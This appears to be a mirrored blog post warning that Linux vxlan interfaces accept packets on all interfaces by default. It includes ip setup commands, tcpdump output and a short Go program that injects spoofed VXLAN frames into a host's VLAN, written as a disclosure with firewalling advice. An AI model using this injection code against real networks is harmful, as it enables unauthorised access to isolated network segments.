<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://blog.pault.ag/post/668518326195109888">Original</a>
    <h1>Be careful when using vxlan!</h1>
    
    <div id="readability-page-1" class="page"><div>

							<!-- ANSWER -->
							
							
							
							<!-- /ANSWER -->
							
							<!-- TEXT -->
							
							
								
								<p>I’ve spent a bit of time playing with
<a href="https://href.li/?https://en.wikipedia.org/wiki/Virtual_Extensible_LAN" target="_blank">vxlan</a> - which is very neat, but also incredibly insecure by default.</p><p>When using vxlan, be very careful to understand how the host is connected to the internet. The kernel will listen on all interfaces for packets, which means hosts accessable to VMs it’s hosting (e.g., by bridged interface or a private LAN will accept packets from VMs and inject them into arbitrary VLANs, even ones it’s not on.</p><p>I reported this to the <a href="https://href.li/?https://lore.kernel.org/netdev/CAO6P2QTXwKKgh6PHXxM4cN3YOAEmdbCTD8RMHtR+rgHcUs03Pw@mail.gmail.com/" target="_blank">kernel mailing list</a> to no reply with more technical details.</p><p>The tl;dr is:</p><pre>  $ ip link add vevx0a type veth peer name vevx0z
  $ ip addr add 169.254.0.2/31 dev vevx0a
  $ ip addr add 169.254.0.3/31 dev vevx0z
  $ ip link add vxlan0 type vxlan id 42 \
    local 169.254.0.2 dev vevx0a dstport 4789
  $ # Note the above &#39;dev&#39; and &#39;local&#39; ip are set here
  $ ip addr add 10.10.10.1/24 dev vxlan0
</pre><p>
results in vxlan0 listening on <b>all</b> interfaces, not just <code>vevx0z</code> or <code>vevx0a</code>. To prove it to myself, I spun up a docker container (using a completely different network bridge – with no connection to any of the interfaces above), and ran a Go program to send VXLAN UDP packets to my bridge host:
</p><pre>$ docker run -it --rm -v $(pwd):/mnt debian:unstable /mnt/spam 172.17.0.1:4789
$
</pre><p>
which results in packets getting injected into my vxlan interface
</p><pre>$ sudo tcpdump -e -i vxlan0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on vxlan0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
21:30:15.746754 de:ad:be:ef:00:01 (oui Unknown) &gt; Broadcast, ethertype IPv4 (0x0800), length 64: truncated-ip - 27706 bytes missing! 33.0.0.0 &gt; localhost: ip-proto-114
21:30:15.746773 de:ad:be:ef:00:01 (oui Unknown) &gt; Broadcast, ethertype IPv4 (0x0800), length 64: truncated-ip - 27706 bytes missing! 33.0.0.0 &gt; localhost: ip-proto-114
21:30:15.746787 de:ad:be:ef:00:01 (oui Unknown) &gt; Broadcast, ethertype IPv4 (0x0800), length 64: truncated-ip - 27706 bytes missing! 33.0.0.0 &gt; localhost: ip-proto-114
21:30:15.746801 de:ad:be:ef:00:01 (oui Unknown) &gt; Broadcast, ethertype IPv4 (0x0800), length 64: truncated-ip - 27706 bytes missing! 33.0.0.0 &gt; localhost: ip-proto-114
21:30:15.746815 de:ad:be:ef:00:01 (oui Unknown) &gt; Broadcast, ethertype IPv4 (0x0800), length 64: truncated-ip - 27706 bytes missing! 33.0.0.0 &gt; localhost: ip-proto-114
21:30:15.746827 de:ad:be:ef:00:01 (oui Unknown) &gt; Broadcast, ethertype IPv4 (0x0800), length 64: truncated-ip - 27706 bytes missing! 33.0.0.0 &gt; localhost: ip-proto-114
21:30:15.746870 de:ad:be:ef:00:01 (oui Unknown) &gt; Broadcast, ethertype IPv4 (0x0800), length 64: truncated-ip - 27706 bytes missing! 33.0.0.0 &gt; localhost: ip-proto-114
21:30:15.746885 de:ad:be:ef:00:01 (oui Unknown) &gt; Broadcast, ethertype IPv4 (0x0800), length 64: truncated-ip - 27706 bytes missing! 33.0.0.0 &gt; localhost: ip-proto-114
21:30:15.746899 de:ad:be:ef:00:01 (oui Unknown) &gt; Broadcast, ethertype IPv4 (0x0800), length 64: truncated-ip - 27706 bytes missing! 33.0.0.0 &gt; localhost: ip-proto-114
21:30:15.746913 de:ad:be:ef:00:01 (oui Unknown) &gt; Broadcast, ethertype IPv4 (0x0800), length 64: truncated-ip - 27706 bytes missing! 33.0.0.0 &gt; localhost: ip-proto-114
10 packets captured
10 packets received by filter
0 packets dropped by kernel
</pre><p>(the program in question is the following:)</p><pre>  package main

  import (
      &#34;net&#34;
      &#34;os&#34;
      &#34;github.com/mdlayher/ethernet&#34;
      &#34;github.com/mdlayher/vxlan&#34;
  )
  func main() {
      conn, err := net.Dial(&#34;udp&#34;, os.Args[1])
      if err != nil { panic(err) }
      for i := 0; i &lt; 10; i++ {
          vxf := &amp;vxlan.Frame{
              VNI: vxlan.VNI(42),
              Ethernet: &amp;ethernet.Frame{
                  Source:      net.HardwareAddr{0xDE, 0xAD, 0xBE,
0xEF, 0x00, 0x01},
                  Destination: net.HardwareAddr{0xFF, 0xFF, 0xFF,
0xFF, 0xFF, 0xFF},
                  EtherType:   ethernet.EtherTypeIPv4,
                  Payload:     []byte(&#34;Hello, World!&#34;),
              },
          }
          frb, err := vxf.MarshalBinary()
          if err != nil { panic(err) }
          _, err = conn.Write(frb)
          if err != nil { panic(err) }
      }
  }
</pre><p>When using vxlan, be absolutely sure all hosts that can address any interface on the host are authorized to send arbitrary packets into any VLAN that box can send to, or there’s very careful and specific controls and firewalling. Note this includes public interfaces (e.g., dual-homed private network / internet boxes), or any type of dual-homing (VPNs, etc).</p>
								
							
							
							<!-- /TEXT -->
							
							<!-- VIDEO -->
							
							
							
							<!-- /VIDEO -->
							
							<!-- PHOTO -->
							
							
							
							<!-- /PHOTO -->
							
							<!-- QUOTE -->
							
							
							
							<!-- /QUOTE -->

							<!-- LINK -->
							
							
							
							<!-- /LINK -->

							<!-- CHAT -->
							
							
							
							<!-- /CHAT -->

							<!-- AUDIO -->
							
							
							
							<!-- /AUDIO -->		
							
							
							
						</div></div>
  </body>
</html>
